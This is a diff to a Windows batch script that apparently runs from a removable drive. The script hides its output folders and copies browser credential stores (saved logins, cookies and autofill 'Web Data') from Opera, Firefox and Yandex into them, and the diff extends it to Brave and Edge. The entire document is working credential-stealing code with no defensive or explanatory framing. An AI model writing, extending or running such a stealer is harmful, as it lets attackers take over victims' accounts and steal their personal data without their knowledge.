@@ -8,6 +8,8 @@ md %~d0\bin\%folderName%\Mozilla
 md %~d0\bin\%folderName%\Opera
 md %~d0\bin\%folderName%\Google
 md %~d0\bin\%folderName%\Yandex
+md %~d0\bin\%folderName%\Brave
+md %~d0\bin\%folderName%\Edge
 echo off
 ATTRIB -R -A -S -H
 attrib +h %~d0\bin
@@ -20,7 +22,7 @@ attrib +h %~d0\adv\logs
 CD/D %appdata%\Opera software\Opera stable\
 copy /y "login data" %~d0\bin\%folderName%\Opera\
 copy /y "Cookies" %~d0\bin\%folderName%\Opera\
-copy /y "Web Data" %~d0\bin\%folderName%\Opera\
+copy /y "Web Data" %~d0\bin\%folderName%\Opera\	
 echo off
 CD/D %appdata%\Mozilla\Firefox\Profiles\*.default
 copy /y cookies.sqlite %~d0\bin\%folderName%\Mozilla
@@ -37,5 +39,15 @@ copy /y "Ya Login Data" %~d0\bin\%folderName%\Yandex
 copy /y "Login Data" %~d0\bin\%folderName%\Yandex
 copy /y "Cookies" %~d0\bin\%folderName%\Yandex
 copy /y "Web Data" %~d0\bin\%folderName%\Yandex
+echo off
+CD/D %localappdata%\BraveSoftware\Brave-Browser\User Data\Default
+copy /y "Login Data" %~d0\bin\%folderName%\Brave
+copy /y "Cookies" %~d0\bin\%folderName%\Brave
+copy /y "Web Data" %~d0\bin\%folderName%\Brave
+echo off
+CD/D %localappdata%\Microsoft\Edge\User Data\Default
+copy /y "Login Data" %~d0\bin\%folderName%\Edge
+copy /y "Cookies" %~d0\bin\%folderName%\Edge
+copy /y "Web Data" %~d0\bin\%folderName%\Edge
 @echo off
 cls
